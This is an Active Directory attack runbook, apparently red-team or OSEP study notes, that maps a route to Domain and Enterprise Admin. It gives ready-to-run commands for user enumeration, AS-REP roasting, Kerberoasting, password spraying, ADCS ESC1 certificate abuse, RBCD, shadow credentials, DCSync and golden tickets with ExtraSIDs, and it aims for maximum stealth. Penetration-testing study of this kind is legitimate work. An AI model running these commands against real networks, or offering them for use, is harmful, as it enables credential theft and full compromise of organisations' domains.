---
tags: [ad, active-directory, kerberos, enumeration, lateral-movement, privilege-escalation]
target_arch: x64
os: windows
---

# 👑 Active Directory Runbook (400/500 Level)

> [!ABSTRACT]
> This runbook is the centralized "Source of Truth" for AD exploitation. It covers the complete lifecycle from unauthenticated discovery to multi-forest domain dominance.
> **Goal**: Map the path to Domain Admin (DA) or Enterprise Admin (EA) and execute the path with maximum stealth.

---

## 🧭 Phase 0: The "Path to DA" Matrix (Cheat Sheet)

| Attack Vector | Requirement | Goal | Key Tool |
| :--- | :--- | :--- | :--- |
| **AS-REP Roasting** | No Pre-Auth account | Crack user password | `Rubeus` / `GetNPUsers.py` |
| **Kerberoasting** | Valid Domain User | Crack service password | `Rubeus` / `GetUserSPNs.py` |
| **ADCS (ESC1)** | Enrollee Supplies SAN | Impersonate DA | `Certify` / `Certipy` |
| **RBCD** | MachineAccountQuota > 0 | Local Admin on Target | `Rubeus` / `impacket-rbcd` |
| **Shadow Credentials**| `GenericWrite` on Object | Capture TGT via Cert | `Whisker` / `pyWhisker` |
| **GPO Abuse** | `WriteProperty` on GPO | DA via Scheduled Task | `SharpGPOAbuse` |
| **Trust Hopping** | SID History / EA Rights | Forest Root Dominance | `Mimikatz` / `BloodHound` |

---

## 🔍 Phase 1: Recon & Enumeration

### 1. Unauthenticated Discovery
```bash
# DNS Enumeration (Find DCs)
nslookup -type=srv _ldap._tcp.dc._msdcs.<DOMAIN>

# User Enumeration (Kerbrute)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>

# LDAP Anonymous Bind (Dump Users/Policy)
ldapdomaindump -u '' -p '' <DC_IP> -o ldap_dump/
```

### 2. Authenticated Enumeration (The "BloodHound" Phase)
> [!TIP] Always start with BloodHound to map the shortest path to DA.
```powershell
# SharpHound (In-Memory)
Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN> -ZipFileName loot.zip

# PowerView (Specific Queries)
Get-DomainUser -SPN                                # Find Kerberoastable
Get-DomainComputer -Unconstrained                  # Find Delegation targets
Get-DomainObjectAcl -Identity "Domain Admins"      # Find who can modify DA
Find-LocalAdminAccess                              # Find where you have admin
```

---

## 🧲 Phase 2: Initial Access & Foothold

### 1. AS-REP Roasting (No Pre-Auth)
```bash
# From Linux
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

### 2. Kerberoasting (Service Accounts)
```powershell
# Rubeus (Auto-request and output hashes)
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

### 3. Password Spraying
> [!DANGER] OPSEC: Check the lockout policy first!
```bash
# Check Policy
netexec smb <DC_IP> -u <USER> -p <PASS> --pass-pol

# Spray (1 attempt per 30 mins)
netexec smb <DC_IP> -u <USERLIST> -p 'Winter2025!' --continue-on-success
```

---

## 🚀 Phase 3: Privilege Escalation & Persistence

### 1. ADCS (Certificate Services)
> [!INFO] See [[OSEP/22. Attacking ADCS]] for full ESC1-ESC8 walkthroughs.
```powershell
# Find Vulnerable Templates
Certify.exe find /vulnerable

# Exploit ESC1 (Request cert for DA)
Certify.exe request /ca:<CA_NAME> /template:<TEMP> /altname:Administrator
```

### 2. RBCD (Resource-Based Constrained Delegation)
If you have `GenericWrite` or `GenericAll` on a computer object:
1. Create a "fake" machine account: `Add-DomainMachineAccount -MachineAccount FAKEPC`
2. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target.
3. Impersonate: `Rubeus.exe s4u /user:FAKEPC$ /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /ptt`

### 3. Shadow Credentials
If you have `GenericWrite` on an object but can't create machine accounts:
```powershell
# Inject public key into msDS-KeyCredentialLink
Whisker.exe add /target:victim_user /domain:corp.local

# Exchange for TGT
Rubeus.exe asktgt /user:victim_user /certificate:<CERT_BASE64> /password:<PASS> /ptt
```

---

## 👑 Phase 4: Domain Dominance & Trust Hopping

### 1. DCSync (Dump the NTDS.dit)
Requires `Replicating Directory Changes` rights (DA/EA/Sync).
```bash
# From Linux
secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc-user Administrator
```

### 2. Cross-Forest Trust Hopping
If you are DA in a child domain and want to reach the Forest Root:
1. Capture `krbtgt` hash of the child domain.
2. Forge a Golden Ticket with **ExtraSIDs** (`S-1-5-21...-519` for Enterprise Admins):
   ```powershell
   Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<ROOT_EA_SID> /user:Administrator /ptt
   ```

---

## 🔗 Related Notes
- [[SMB-Modern-PoC]] - For lateral movement via SMB.
- [[Admin Reference]] - For user/group management and setup.
- [[SQL Attacks]] - For lateral movement via MSSQL links.
- [[Tunneling]] - For cross-segment AD attacks.
- [[03-loaders/RUNBOOK]] - For executing tools like Rubeus/Mimikatz in-memory.
